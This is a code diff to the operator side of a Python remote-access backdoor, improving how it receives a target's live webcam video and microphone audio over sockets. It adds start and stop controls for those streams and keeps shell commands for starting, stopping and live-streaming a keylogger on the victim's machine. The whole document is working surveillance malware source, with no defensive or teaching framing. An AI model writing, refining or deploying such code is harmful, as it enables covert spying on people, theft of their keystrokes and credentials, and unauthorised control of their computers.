@@ -128,12 +128,15 @@ def keylogging_live():
         keylog = reliable_recv()
         print(keylog) if keylog != 'end of keylogging' else None
 
-# --- Global Flag to Stop Threads ---
+# --- Global Flags ---
 stop_threads = False
+video_thread_active = False
+audio_thread_active = False
 
 # --- Stream Reception Functions ---
 def video_reception_thread():
-    global stop_threads
+    global stop_threads, video_thread_active
+    video_thread_active = True
     video_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     video_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     video_server.bind(('0.0.0.0', VIDEO_PORT))
@@ -147,7 +150,7 @@ def video_reception_thread():
         data = b""
         payload_size = struct.calcsize("L")
 
-        while not stop_threads:
+        while not stop_threads and video_thread_active:
             while len(data) < payload_size:
                 packet = conn.recv(4096)
                 if not packet: raise ConnectionError("Client disconnected")
@@ -166,17 +169,21 @@ def video_reception_thread():
             frame = pickle.loads(frame_data)
             cv2.imshow('Live Video Stream', frame)
             if cv2.waitKey(1) & 0xFF == ord('q'):
-                print("[!] 'q' pressed in video window. Type 'quit' in shell to exit.")
-                # Don't stop threads here, let the main shell handle it
+                print("[!] 'q' pressed in video window. Type 'stream_stop' in shell to exit.")
+                break
     except Exception as e:
         print(f"[!] Video stream ended: {e}")
     finally:
         print("[-] Video reception thread finished.")
         cv2.destroyAllWindows()
+        if 'conn' in locals():
+            conn.close()
         video_server.close()
+        video_thread_active = False
 
 def audio_reception_thread():
-    global stop_threads
+    global stop_threads, audio_thread_active
+    audio_thread_active = True
     audio_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     audio_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     audio_server.bind(('0.0.0.0', AUDIO_PORT))
@@ -190,7 +197,7 @@ def audio_reception_thread():
         p = pyaudio.PyAudio()
         stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True)
         
-        while not stop_threads:
+        while not stop_threads and audio_thread_active:
             data = conn.recv(1024)
             if not data: break
             stream.write(data)
@@ -198,12 +205,20 @@ def audio_reception_thread():
         print(f"[!] Audio stream ended: {e}")
     finally:
         print("[-] Audio reception thread finished.")
+        if 'stream' in locals() and stream.is_active():
+            stream.stop_stream()
+            stream.close()
+        if 'p' in locals():
+            p.terminate()
+        if 'conn' in locals():
+            conn.close()
         audio_server.close()
+        audio_thread_active = False
 
 # Function for the main communication loop with the target
 def target_communication():
-    # global keylogging_filename, keylogging_status, liveaudio_status, audio_filename, livekeylogging_status
     global keylogging_filename, keylogging_status,  livekeylogging_status, stop_threads
+    global video_thread_active, audio_thread_active
 
     while not stop_threads:
         command = input('* Shell~%s: ' % str(ip))
@@ -211,6 +226,8 @@ def target_communication():
 
         if command == 'quit':
             stop_threads = True
+            video_thread_active = False
+            audio_thread_active = False
             break
 
         elif command == 'clear':
@@ -228,7 +245,6 @@ def target_communication():
         elif command[:16] == 'keylogging_start':
             filename = re.sub(r'[\\/:*?"<>|]', '', command[17:]).replace(' ', '')
             keylogging_filename = filename if (len(command) > 17 and filename != "") else 'keylog.txt'
-
             keylogging_start()
 
         elif command[:15] == 'keylogging_stop':
@@ -237,20 +253,26 @@ def target_communication():
         elif command[:15] == 'keylogging_live':
             if not livekeylogging_status:
                 filename = re.sub(r'[\\/:*?"<>|]', '', command[16:]).replace(' ', '')
-
                 if len(command) > 16:
                     keylogging_filename = filename if (filename != "") else 'keylog.txt'
-
                 livekeylogging_status = True
                 keylogging_live()
             else:
                 print('[!] Live keylogging is already running.')
 
         elif command == 'stream_start':
-            v_thread = threading.Thread(target=video_reception_thread, daemon=True)
-            a_thread = threading.Thread(target=audio_reception_thread, daemon=True)
-            v_thread.start()
-            a_thread.start()
+            if not video_thread_active:
+                v_thread = threading.Thread(target=video_reception_thread, daemon=True)
+                v_thread.start()
+            if not audio_thread_active:
+                a_thread = threading.Thread(target=audio_reception_thread, daemon=True)
+                a_thread.start()
+            # The result from the backdoor will be printed in the 'else' block
+
+        elif command == 'stream_stop':
+            video_thread_active = False
+            audio_thread_active = False
+            # The result from the backdoor will be printed in the 'else' block
 
         else:
             # For other commands, receive and print the result from the target.
